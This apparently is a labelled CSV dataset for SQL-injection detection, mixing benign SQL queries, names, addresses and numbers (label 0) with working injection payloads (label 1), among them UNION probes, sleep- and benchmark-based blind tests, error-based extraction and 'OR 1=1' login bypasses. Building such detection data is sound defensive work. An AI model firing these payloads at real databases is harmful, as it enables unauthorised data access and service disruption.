Query,Label
SELECT thy ( s )  FROM engine UNION,0
"calle miquel santandreu 66,",0
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ),0
oviedo,0
nuez de balboa 131 2-f,0
SELECT poetry ( s )  FROM cream SELECT heart FROM creature,0
ansorger,0
"1""   )    )    AnD 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  SElEcT   (  CaSE wheN   (  2853  =  2853  )   THeN 1 ElsE 0 eNd   )    )   ::TExt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    As numeric  )   AnD    (    (   ""mxnj"" LIKe ""mxnj",1
1'+  (  selEcT 'rpds' wHerE 5870  =  5870 AND 4595  =  4595#,1
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,0
"SEleCt sleeP  (  5  )   ANd   (  ""tlbj"" LIKe ""tlbj",1
"1%""   )    )    unIOn aLL sELeCt NulL,NulL,NulL,NulL,NulL,NulL#",1
SELECT city ( s )  FROM secret,0
SELECT COUNT ( forest ) FROM visit,0
torre-cardela,0
1'  )   AS jwch wHeRE 4609  =  4609,1
SELECT COUNT ( something ) FROM driving,0
"1""   )    )    Or elt  (  6272  =  6272,SLEeP  (  5   )    )    AND    (    (   ""chvi"" LiKE ""chvi",1
"1'  )   ANd make_set  (  8403  =  8403,8899  )   ANd   (  'dhoo' LiKe 'dhoo",1
SELECT * FROM point,0
DELETE FROM greatest,0
SELECT COUNT ( primitive ) FROM especially,0
5153,0
"1' iN boolean mode  )   uNiOn ALl SelEcT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl--",1
SELECT * FROM chain  WHERE alive NOT LIKE '[recent]%',0
"1'  )   And make_set  (  8403  =  8403,8899  )",1
SELECT * FROM compass,0
SELECT * FROM year WHERE represent = 'natural',0
colls messegu,0
SELECT AVG ( spend ) FROM turn SELECT SUM ( widely ),0
SELECT AVG ( imagine ) FROM directly,0
"selecT * fRom users WHErE id  =  1 or 1#"", unioN selecT 1,VeRSion  (    )   -- 1",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11710 )  ORDER BY meta_id ASC",0
"1 aNd make_set  (  8403  =  8403,8899  )",1
(  sELect   (  cASE WHEN   (  4108  =  4108  )   thEn 1 eLsE 4108*  (  sELect 4108 FroM information_schema.character_sets  )   eNd   )    ),1
"1""   )    )    aS lfte whEre 3811  =  3811 OR exp  (  ~  (  SELEcT * fROM   (  SELEcT concat  (  0x7171706a71,  (  SELEcT   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT TOP 3 * FROM attack WHERE doctor = 'coat' SELECT * FROM smaller,0
"INSERT INTO stranger ( outside, choice, too, sea, root, smile )  VALUES  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )",0
-3849  )   oR 5580  =  3442--,1
pardos@barcafedaniss.co,0
SELECT * FROM  ( SELECT black FROM of ),0
intxaurraga,0
"-2007%'   )    )    unioN AlL SElect 7298,7298,7298#",1
SELECT * FROM nice WHERE affect = 'decide'  AND City = 'whenever',0
-9145'  )   or 5903  =    (  'qqpjq'||  (  sELeCT caSE 5903 WHeN 5903 thEN 1 else 0 eNd FROm rdb$daTABASE  )  ||'qzvzq'  )   aND   (  'yvfl' like 'yvfl,1
SELECT TOP 50 PERCENT * FROM area SELECT * FROM wise FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM throat,0
piperni,0
SELECT * FROM  ( SELECT machine FROM combine ),0
bocana$da,0
SELECT AVG ( successful ) FROM ride,0
SELECT * FROM check ORDER BY anything DESC,0
"1""   )    )     )   unIOn AlL sELeCT NuLL,NuLL,NuLL,NuLL,NuLL#",1
"-4653' oR 1 gRoup by concat  (  0x7171706a71,  (  SeLEcT   (  CASe When   (  4232  =  4232  )   THEN 1 ElSe 0 ENd   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    HAVInG min  (  0  )  #",1
"1'+  (  seLECT qjng wHErE 1897  =  1897 ANd 6414  =    (  seLECT count  (  *  )   frOm rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4   )    )   +'",1
SELECT * FROM avoid WHERE chamber = 'port'  OR learn = 'it',0
7250,0
-9534%' oR 3038  =  3038,1
"admin"" OR ""1""  =  ""1""/*",1
SELECT * FROM local WHERE go = 'western' FETCH FIRST 3 ROWS ONLY,0
7.28868E+15,0
"-9810'  )   WhERE 4361  =  4361 or elt  (  1032  =  1032,3623  )  --",1
SELECT MIN ( property )  AS attempt FROM explore,0
SELECT * FROM  ( SELECT quiet FROM perfect ),0
"1""  )   As hymr whEre 5497  =  5497 UnioN all sELEct NUll,NUll,NUll,NUll--",1
16370,0
"SELECT anybody, rough+ ', ' + wide+ ' ' + laid+ ', ' + folks AS yet  FROM clay",0
selEcT name From syscolumns WHeRe id   =     (  sele ...,1
"1  )   AS ujjg WheRE 3125  =  3125 union AlL sELEct nuLL,nuLL,nuLL,nuLL,nuLL,nuLL#",1
rillo de gallo,0
"-9896""   )    )     )   UNiOn ALL sELect 4073,4073,4073,4073,4073#",1
SELECT clay,0
SELECT MIN ( height )  AS lost FROM fair,0
1'   )    )    aND   (  1427  =  5813  )  *5813 aND    (    (   'estb' LiKE 'estb,1
372,0
"SELECT habit, gun, directlyFROM wise WHERE strip  IS NOT NULL",0
"-8414%""  )   UnIon all sEleCT 2795#",1
2331,0
"-4305  )   aS ldrt Where 2567  =  2567 UNioN all SeleCt 2567,2567,2567,2567,2567,2567,2567#",1
SELECT AVG ( shot ) FROM design,0
4270,0
1'+  (  SeLEcT 'ncny' wHERE 5634  =  5634,1
"SELECT pick,peace,available,seems,above     (  (  wing JOIN younger ON wrapped.on =  doubt.tobacco )   INNER JOIN influenceON Orders.sit =  highway.inID )",0
SELECT COUNT ( special ) FROM west,0
"alcdia de crespins, l'",0
SELECT * FROM  ( SELECT basic FROM ever ),0
SELECT * FROM truth 3,0
"-9923%'   )    )     )   uNiON ALl selECt 8985,8985,8985,8985,8985,8985,8985#",1
"UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0
SELECT lost ( s )  FROM obtain FULL OUTER JOIN,0
SELECT TOP 50 PERCENT * FROM definition SELECT * FROM practice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM cook,0
SELECT * FROM nuts WHERE exercise = 'married'  AND City = 'step',0
1   )    )    aS goar WhEre 2405  =  2405 AND 5927  =  9731--,1
SELECT * FROM claws  WHERE boy NOT LIKE '[thus]%',0
SELECT * FROM depth WHERE being NOT LIKE 'himself%',0
FROM  ( SELECT DISTINCT include FROM high ),0
"1'  )   As noqp WheRE 4042  =  4042 or 8315  =    (  SELeCT count  (  *  )   FROM sysibm.systables As t1,sysibm.systables As t2,sysibm.systables As t3  )  --",1
SELECT film ( s )  FROM getting UNION ALL,0
"1'   )    )     )   aNd 3202  =  lIKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    aNd    (    (     (  'isyg'  =  'isyg",1
SELECT AVG ( public ) FROM gasoline,0
SELECT * FROM refused WHERE whom = 'climb'  AND City = 'alive',0
14140,0
SELECT COUNT ( share ) FROM apple,0
SELECT * FROM grew WHERE lion = 'diameter'  OR attempt = 'broken',0
SELECT steam ( s )  FROM useful UNION ALL,0
UPDATE slipped SET field = 'pleasant'WHERE ocean = 'hungry',0
"1""  )   wHeRe 2657  =  2657 AnD 5309  =  7592--",1
1'  )   oR   (  SElect * FroM   (  SElect  (  Sleep  (  5   )    )     )  ydpu  ),1
"1 wHeRE 2146  =  2146 oR 8384  =  lIKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1"" WhERe 2452  =  2452",1
"joaquin verdaguer, 183",0
SELECT * FROM alive WHERE NOT division = 'observe'  AND NOT recall = 'heat',0
SELECT * FROM upper WHERE strip NOT LIKE 'steady%',0
SELECT * FROM hold 3 SELECT * FROM statement,0
bayliss,0
7.05E+15,0
1  )   wHeRe 2468  =  2468 anD   (  SelECT * fROm   (  SelECT  (  SlEeP  (  5   )    )     )  gcrr  )  #,1
SELECT * FROM yes WHERE certainly IN  ( SELECT heard FROM track ),0
"1' ANd   (  selEcT 2*  (  if   (    (   selEcT * fROM   (  selEcT concat  (  0x7171706a71,  (  selEcT   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   ANd 'wjwn'  =  'wjwn",1
1'  )   ANd 6240  =    (  'qqpjq'||  (  sELeCt case 6240 When 6240 TheN 1 ELse 0 ENd frOm rdb$DATAbaSE  )  ||'qzvzq'  ),1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28072 )  ORDER BY meta_id ASC",0
"SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL",0
SELECT SIN ( 2 ) ;,0
89285662f,0
"1 oR extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  sELecT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1
"1%'   )    )     )   aND 8514  =    (  SeLECt count  (  *  )   FROm domain.domains As t1,domain.columns As t2,domain.tables As t3  )   aND    (    (     (  '%'  =  '",1
SELECT * FROM alone WHERE    NOT kitchen = 'or',0
DELETE FROM exercise,0
SELECT thick ( s ) FROM pleasant INNER JOIN,0
-5211 UnIOn AlL sELeCt 1754--,1
DELETE FROM right WHERE gather = 'already',0
"1' in boolean mode  )   Or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1'+  (  selECt mumb WhERe 4658  =  4658 oR CHAR  (  119  )  ||CHAR  (  100  )  ||CHAR  (  99  )  ||CHAR  (  121  )    =  regexp_substring  (  repeat  (  rIGHt  (  CHAR  (  1441  )  ,0  )  ,5000000000  )  ,NuLL  )  --",1
SELECT dark ( s )  FROM read SELECT charge FROM cabin,0
SelECT   (  CAse WHeN   (  6839  =  2730  )   Then 6839 Else 6839*  (  SelECT 6839 frOM mysql.db  )   End  )  #,1
1  )   As vbli whERe 5139  =  5139 aND 2782  =  2625--,1
SELECT * FROM consider WHERE bone IN  ( SELECT walk FROM down ),0
jasmann,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0
SELECT MIN ( saw )  AS instance FROM either,0
buenda,0
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0
maryrose,0
SELECT these ( s )  FROM within UNION,0
"SELECT trace AS shade, suggest AS [later]  FROM aware",0
"1'||  (  seleCT 'dpje' where 2704  =  2704 OR cHar  (  75  )  ||cHar  (  70  )  ||cHar  (  99  )  ||cHar  (  83  )    =  regexp_substring  (  repeat  (  lefT  (  crypt_key  (  cHar  (  65  )  ||cHar  (  69  )  ||cHar  (  83  )  ,nulL  )  ,0  )  ,500000000  )  ,nulL  )  --",1
gribov-ridgeley@creacionwebs.lk,0
"1'+  (  SeleCT uzan WhErE 4312  =  4312 ANd make_set  (  3129  =  9555,9555   )    )   +'",1
SELECT TOP 3 * FROM trunk WHERE great = 'mental' SELECT * FROM trick,0
"1%"" OR 6979  =  liKe  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1"" and 3580  =    (  SelecT count  (  *  )   FRom domain.domains As t1,domain.columns As t2,domain.tables As t3  )  --",1
SELECT COUNT ( especially )  FROM nodded,0
1  )   AS rqac wHeRE 3381  =  3381 ANd 6240  =    (  'qqpjq'||  (  sElECt cASe 6240 whEn 6240 THeN 1 ElsE 0 end fROm rdb$datAbase  )  ||'qzvzq'  )  --,1
SELECT * FROM arrange ORDER BY southern DESC,0
"1'  )   wHERe 6634  =  6634 OR 8466  =  BenChMaRk  (  5000000,md5  (  0x694a4745   )    )   --",1
"SELECT * FROM belt WHERE sharp NOT IN  ( 'smell', 'opportunity', 'start' )",0
33001,0
UPDATE brick SET may = 'taste'WHERE score = 'key',0
SELECT * FROM tank WHERE house = 'secret' LIMIT 3,0
SELECT TOP 3 * FROM direction SELECT * FROM theory 3SELECT * FROM tail,0
SELECT * FROM that  WHERE suddenly = connected,0
"INSERT INTO careful  ( dropped, extra, thirty )  VALUES  ( 'length', 'were', 'been' )",0
SELECT shade ( s )  FROM yard,0
"1%""   )    )    And 6414  =    (  SelecT count  (  *  )   fRom rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )   And    (    (   ""%""  =  """,1
"1'  )   And make_set  (  8403  =  8403,8899  )   And   (  'kyxl'  =  'kyxl",1
"-5313'  )   uNiOn all sElEcT 7187,7187,7187#",1
schauer,0
1  )   WHERE 2734  =  2734 waitfor delay '0:0:5'--,1
"SElecT * fRoM users WHere id  =  '1' + @ 1! uNiOn SElecT 1,vERsiON  (    )   -- 1'",1
"-4032""   )    )    oR 3440  =  caST   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sELeCT   (  CASe WHen   (  3440  =  3440  )   THen 1 elSe 0 enD   )    )   ::tExT||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AS numeric  )   AND    (    (   ""olox""  =  ""olox",1
"1'||  (  seLect 'txyy' WHerE 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  BEnchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0
"1'   )    )     )   Or 4411  =    (  SELecT count  (  *  )   FROm sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )   aNd    (    (     (  'gucd'  =  'gucd",1
"1""  )   WHere 9461  =  9461 uNIon All SELECT NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL#",1
SELECT * FROM completely WHERE naturally = 'zoo',0
SELECT COUNT ( windowID ) FROM top,0
sEleCT   (  CaSE WHeN   (  3626  =  6022  )   tHEn 3626 Else CaSt  (  1 aS int  )  /  (  sEleCT 0 FROm dual  )   eND  )   FROm dual--,1
"1',  (  SELeCT   (  Case wHen   (  6948  =  4654  )   Then 1 elSE 6948*  (  SELeCT 6948 fROm mysql.db  )   ENd   )    )",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",0
a4561o9nz68,0
"1   )    )    as cusv WheRe 4871  =  4871 And elt  (  1210  =  1210,SLEeP  (  5   )    )   --",1
pozaldez,0
1   )    )    aS ctqr wHERe 2609  =  2609,1
SELECT * FROM scientific WHERE stage LIKE '%happy%',0
"-1526'   )    )    Or elt  (  1032  =  1032,3623  )   aND    (    (   'xpob'  =  'xpob",1
"1  )   oR 9643  =    (  SELeCt count  (  *  )   fROM domain.domains aS t1,domain.columns aS t2,domain.tables aS t3  )   anD   (  3814  =  3814",1
59137152n,0
"-6292  )   uNion all sELECt 7499,7499,7499,7499,7499,7499,7499--",1
"1' OR   (  SelecT 2*  (  if   (    (   SelecT * fROm   (  SelecT concat  (  0x7171706a71,  (  SelecT   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aNd 'qvyq' LIke 'qvyq",1
"1' ANd 8514  =    (  SelEcT count  (  *  )   FrOM domain.domains AS t1,domain.columns AS t2,domain.tables AS t3  )",1
SELECT TOP 3 * FROM tune SELECT * FROM feel 3SELECT * FROM statement,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3836 )  ORDER BY meta_id ASC",0
"1'   )    )    uNION ALl SEleCT NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL#",1
SELECT COUNT ( tears ) FROM might,0
hervs bediaga,0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0
SELECT * FROM please WHERE wind BETWEEN 'printed' AND 'previous',0
"SELECT Orders.thusrID, Employees.yet, Employees.table FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.coverID ORDER BY Orders.deadID",0
1'  )   WHeRe 4949  =  4949,1
1.44E+15,0
sELECt   (  caSE wHEN   (  3855  =  3855  )   Then 3855 eLSE 1/  (  sELECt 0  )   eND  )  --,1
cremades@baltasarsantos.kn,0
4.86024E+14,0
1 rlike   (  seLEct   (  caSe wHEn   (  8314  =  5463  )   ThEn 1 ELSE 0x28 end   )    ),1
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,0
4259,0
"c/ hermenegilda portillo, 70",0
1'   )    )     )   or 6793  =    (  seLecT 6793 fRoM pg_sleep  (  5   )    )    anD    (    (     (  'ugrk'  =  'ugrk,1
SELECT picture FROM vowel UNION SELECT plus FROM necessary ORDER BY coming,0
SELECT vowel ( s ) FROM burn INNER JOIN,0
lttecke,0
SELECT * FROM globe WHERE hide NOT BETWEEN 'appearance' AND 'common',0
"SELECT monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed AS built  FROM development",0
81383348x,0
-2431'  )   oR 8571  =  8571--,1
"1'+  (  SelECT 'nhlx' WhERe 2291  =  2291 or   (  SelECT 9173 froM  (  SelECT count  (  *  )  ,concat  (  0x7171706a71,  (  SelECT   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x froM information_schema.character_sets GrOUp by x  )  a   )    )   +'",1
"c/ fray diego de cadiz, 50",0
SELECT * FROM  ( SELECT locate FROM root ),0
yeste meloda,0
"SElEcT * FrOm users wheRe id  =  1 Or ""??"" Or 1  =  1 -- 1",1
masahiro,0
sa5na,0
ductilidad,0
SELECT AVG ( clear )  FROM problem  SELECT SUM ( plane ),0
nealson,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28446,28587,28591,28618,28621,28633,28636,28691,28696,28699,28707,28710,28728,28733 )  ORDER BY meta_id ASC",0
1 AND 1  =  1,1
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0
70,0
"-2190'  )   WhERE 8890  =  8890 uNIOn All sEleCT 8890,8890#",1
SELECT * FROM man WHERE prove IN  ( SELECT are FROM way ),0
SELECT AVG ( done )  FROM ordinary  SELECT SUM ( closely ),0
5ictoriosamente,0
"sELecT * fRoM users Where id  =  '1' UnIOn sELecT +\,@@VeRsIOn -- 1'",1
bablica,0
"SELECT introduced,pure FROM teacher WHERE describe = 'century' UNION SELECT roll, seat FROM possible",0
1  )   WHEre 7159  =  7159,1
49211,0
"-8661"" uNIon ALL SELecT 5731,5731--",1
9.16233E+15,0
"SELECT INSERT ( ""W3Schools.com"", 11, 3, ""no"" ) ;",0
"1  )   anD 9254  =    (  selEcT count  (  *  )   FRom rdb$fields AS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions AS t4  )  --",1
50610,0
1'+  (  SELecT 'supo' WHEre 8691  =  8691,1
SELECT * FROM sign WHERE begun BETWEEN various09/01/1996steel AND into15/31/1996instance,0
"1'   )    )    AS qwdh wherE 7581  =  7581 or cHar  (  117  )  ||cHar  (  111  )  ||cHar  (  105  )  ||cHar  (  100  )    =  regexp_substring  (  repeat  (  LEFt  (  crypt_key  (  cHar  (  65  )  ||cHar  (  69  )  ||cHar  (  83  )  ,nuLL  )  ,0  )  ,500000000  )  ,nuLL  )  --",1
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ),0
calle laguna de pealara 171 12-e,0
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0
"SELECT * FROM manner ORDER BY ten ASC, winter DESC",0
shrum@uniovivirtual.nz,0
1%'  )   AnD 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElECt   (  Case WhEn   (  4386  =  4386  )   thEn 1 ELSe 0 End  )   frOM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AnD   (  '%'  =  ',1
SELECT AVG ( perfectly ) FROM band,0
"1"" AND   (  sElECt * FRoM   (  sElECt  (  sLEep  (  5   )    )     )  fzno  )   AND ""gddl"" lIKe ""gddl",1
1'  )   As dqgr wherE 2427  =  2427 aND   (  3020  =  3020  )  *6703--,1
"1""   )    )     )   ANd 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElect   (  CaSE wHeN   (  6055  =  6055  )   TheN 1 eLSe 0 END  )   fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   ANd    (    (     (  ""urgd""  =  ""urgd",1
maximiliano,0
1  )   wHEre 3979  =  3979 rlike sLeeP  (  5  )  --,1
SELECT baseball FROM teacher UNION ALL SELECT yellow FROM does ORDER BY without,0
DELETE FROM dull,0
8.1203E+15,0
SELECT * FROM choose WHERE straw = 'wire' LIMIT 3,0
SELECT * FROM but WHERE plastic NOT LIKE '[market]%',0
SELECT column_name FROM table_name AS alias_name;,0
"iif  (  5519  =  4796,1,1/0  )",1
-2951 OR 4144  =    (  sELeCt upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sELeCt   (  case WHEN   (  4144  =  4144  )   tHEn 1 ELsE 0 enD  )   FRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FRom dual  )  # gwqv,1
enanzar,0
"SELECT column1 , column2, ... FROM table_name WHERE NOT condition ;",0
ingelber,0
sandler,0
"SELEcT * FRom users WhEre id  =  1 Or \<$ UnION SELEcT 1,@@versION -- 1",1
SELECT unhappy FROM baby UNION SELECT kill FROM cake ORDER BY arrow,0
SELECT TOP 3 * FROM hurried WHERE table = 'cow',0
SELECT AVG ( bone ) FROM bare SELECT SUM ( happily ),0
"SELECT anybody, dish, forestFROM coal WHERE apartment  IS NOT NULL",0
"1%""   )    )    oR   (  SELEcT * from   (  SELEcT  (  SleEP  (  5   )    )     )  sddo  )  #",1
SELECT COUNT ( second )  FROM inside,0
angeles jarama,0
69 47164 F6 reply F6 1568 0 csdf1123mVwbHk  =   9 134 e_qna eng modify 38 22747 22747 3945 556 V gallery2 view 366 3 F1 read F1 8628 80 sub0204 photo OPTOMA 218 30 02_01 1091 wr_datetime asc 2 sub0203 photo e_qna eng 8 18489 bbs338 12 view 132,0
OR 1 In   (  seleCT @@verSIOn  )  --,1
6.25668E+15,0
"-1150'  )   As hdby wHerE 4032  =  4032 uNion AlL SELEct 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1
16926,0
"-5616""   )    )     )   oR 1570  =  ConVErT  (  int,  (  sEleCt cHAR  (  113  )  +cHAR  (  113  )  +cHAR  (  112  )  +cHAR  (  106  )  +cHAR  (  113  )  +  (  sEleCt   (  CaSe whEn   (  1570  =  1570  )   theN cHAR  (  49  )   eLse cHAR  (  48  )   END   )    )   +cHAR  (  113  )  +cHAR  (  122  )  +cHAR  (  118  )  +cHAR  (  122  )  +cHAR  (  113   )    )     )   And    (    (     (  ""hdrb"" LIke ""hdrb",1
psklib,0
"seLect * from users wHERE id  =  1 OR 1#""$ Union seLect 'a',VERsIOn  (    )   -- 1",1
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0
-5389'||  (  sElect 'gggl' wHeRe 1020  =  1020 UNiON alL sElect 1020#,1
thibaut,0
hi' OR 'a'  =  'a,1
"SELECT * FROM claws WHERE pour NOT IN  ( 'mountain', 'began', 'prove' )",0
1  )   wheRE 6304  =  6304,1
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids,0
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ),0
"SeLeCt count  (  *  )   FroM sysibm.systables As t1,sysibm.systables As t2,sysibm.systables As t3 anD   (  'fwok' LiKE 'fwok",1
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY,0
"1'||  (  sElECT 'akye' wheRE 9242  =  9242 uNIon aLL sElECT NulL,NulL,NulL,NulL,NulL,NulL#",1
SELECT trick FROM fear UNION ALL SELECT tall FROM science ORDER BY spread,0
SELECT MIN ( service )  AS leaving FROM tales,0
SELECT TOP 3 * FROM bigger SELECT * FROM could 3SELECT * FROM wooden,0
8.62453E+15,0
SELECT scientific ( s )  FROM term UNION ALL,0
"1'  )   aS khaa wHEre 8157  =  8157 aNd 2388  =  bENChmaRk  (  5000000,md5  (  0x6d457153   )    )   #",1
49645694x,0
shing-mi,0
"1""  )   AnD 6969  =    (  seleCT 6969 FRoM pg_sleep  (  5   )    )    AnD   (  ""btht""  =  ""btht",1
"SELECT Orders.dayrID, Employees.support, Employees.away FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.instanceID ORDER BY Orders.decideID",0
"1'+  (  SeLEcT zfpk WHERE 9784  =  9784 OR 4411  =    (  SeLEcT count  (  *  )   frOm sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7   )    )   +'",1
"SELECT column_name ( s )  FROM show,solve",0
banderizar,0
saint-simon-vondis@paremoselalzheimer.dj,0
selEct * FRom users wHeRE id  =  1 oR $<\. oR 1  =  1 -- 1,1
"1"" WhEre 1920  =  1920 ANd 8635  =    (  seLeCT count  (  *  )   FRom generate_series  (  1,5000000   )    )   --",1
urbina granda,0
holgorio,0
avril,0
"-5207  )   wHERE 6987  =  6987 Or 1570  =  cONvErt  (  int,  (  seLeCT cHAR  (  113  )  +cHAR  (  113  )  +cHAR  (  112  )  +cHAR  (  106  )  +cHAR  (  113  )  +  (  seLeCT   (  cASE wheN   (  1570  =  1570  )   tHEN cHAR  (  49  )   ELsE cHAR  (  48  )   end   )    )   +cHAR  (  113  )  +cHAR  (  122  )  +cHAR  (  118  )  +cHAR  (  122  )  +cHAR  (  113   )    )     )  --",1
verschuer_greenleaf@cajucar.cx,0
"-8060""  )   WHEre 5290  =  5290 or 5903  =    (  'qqpjq'||  (  sElect case 5903 whEn 5903 ThEN 1 ELSE 0 enD fROM rdb$dataBASE  )  ||'qzvzq'  )  --",1
SELECT * FROM through WHERE vegetable LIKE '%universe%',0
15495714q,0
"SELECT solveID AS ID, herself AS near FROM owner",0
"INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )",0
9810,0
SELECT hand,0
"1  )   as skby wheRE 4269  =  4269 oR elt  (  6272  =  6272,SLeEp  (  5   )    )   --",1
SELECT AVG ( Price ) FROM zoo,0
8.61689E+15,0
SELECT * FROM  ( SELECT announced FROM knew ),0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 14594 )  ORDER BY meta_id ASC",0
casanellas berlingery,0
8232,0
28900,0
"INSERT INTO lips  ( good, jump, around )  VALUES  ( 'silk', 'income', 'throughout' )",0
